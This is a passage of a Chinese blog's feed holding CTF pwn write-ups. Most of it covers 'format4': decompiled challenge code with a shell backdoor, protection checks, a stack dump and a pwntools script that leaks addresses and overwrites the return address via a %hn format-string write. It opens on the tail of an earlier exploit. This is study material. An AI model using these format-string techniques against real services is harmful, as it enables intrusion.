class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....&#x27;</span>,pad)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-知识点">4.知识点</h2><h3 id="1">(1)</h3><p>%n和%p等都可以用%[order]$n,%[order]$p等形式访问,这里的order是格式化字符串的第order个参数,即printf()的参数表的第order+1个参数</p><h3 id="2">(2)</h3><p>在任意地址写的时候一般不把地址放在payload前面,因为地址往往前面都会有0让printf()读取参数时直接截断</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-防护检查&quot;&gt;1.防护检查&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>format4 Write Up</title>
    <link href="https://www.fomal.cc/posts/6827ffcb.html"/>
    <id>https://www.fomal.cc/posts/6827ffcb.html</id>
    <published>2023-04-09T10:13:34.838Z</published>
    <updated>2023-04-09T10:15:46.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-源代码">1.源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-31h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leave something.....&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">32uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;anything else to say?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%2s&quot;</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != <span class="string">&#x27;n&#x27;</span> &amp;&amp; v1 != <span class="string">&#x27;N&#x27;</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  ini(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Format String 4/4&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>​发现保护全开,不过已经在IDA找到了调用shell的后门函数,还有一个vuln()循环使用直到输入’n’或者’N’的函数,其内部存在格式化字符串漏洞,所以利用两次格式化字符串漏洞泄露出栈的地址和程序加载地址,通过IDA提供的偏移量稍微计算获得要修改的返回地址的栈的地址和后门函数实际地址.再通过位运算获得下面exp中ret的后四位,用A填充成16字节,因为格式化字符串的第八个参数是格式化字符串,前面已经占用了16字节,所以要修改的stack就是%10$hn.虽然用hn只能修改最后四个字节的数据,但是PIE基址随机是以页为单位,大小为0x1000,所以最少只要更改后面的三个字节,用hn比n会更方便一些.</p><pre><code>最后在调试exp时还发现虽然scanf()能接受%2s但是如果输入超过一个字符会直接跳过下次循环的第一次输入,调整一下获得flag</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffffffddc0 ◂— 0x11</span><br><span class="line">01:0008│     0x7fffffffddc8 ◂— 0x41007ffff7fae6a0</span><br><span class="line">02:0010│     0x7fffffffddd0 ◂— <span class="string">&#x27;%8$p%9$p%10$p\n&#x27;</span></span><br><span class="line">03:0018│     0x7fffffffddd8 ◂— 0xa7024303125 /* <span class="string">&#x27;%10$p\n&#x27;</span> */</span><br><span class="line">04:0020│     0x7fffffffdde0 —▸ 0x555555400a40 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│     0x7fffffffdde8 —▸ 0x7fffffffde10 ◂— 0x0</span><br><span class="line">06:0030│     0x7fffffffddf0 —▸ 0x5555554007f0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">07:0038│     0x7fffffffddf8 ◂— 0x8fd9ef6ec969cc00 </span><br><span class="line">08:0040│ rbp 0x7fffffffde00 —▸ 0x7fffffffde10 ◂— 0x0 <span class="comment">#previous rbp可以泄露出栈的地址,减去0x8就是现在的rbp</span></span><br><span class="line">09:0048│     0x7fffffffde08 —▸ 0x555555400a39 (main+46) ◂— mov    eax, 0 <span class="comment">#函数返回地址,通过这个弄出程序加载基地址</span></span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;ip&#x27;</span>,port)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">第8格式化字符串,第15个返回地址-0xa39+0x951获得程序加载地址,第14个-0x8直接获得栈地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....\n&#x27;</span>,<span class="string">b&#x27;%14$p&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x8</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;anything else to say?\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....\n&#x27;</span>,<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">ret=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xa39</span>+<span class="number">0x951</span> <span class="comment">#64位程序栈对齐所以跳过了push rbp</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;anything else to say?\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hn&#x27;</span> <span class="comment">#获得ret的最后四位并转化成字节型数据</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">b&#x27;A&#x27;</span>)+p64(stack)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;anything else to say?\n&#x27;</span>,<span class="string">b&#x27;no&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-源代码&quot;&gt;1.源代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
</feed>
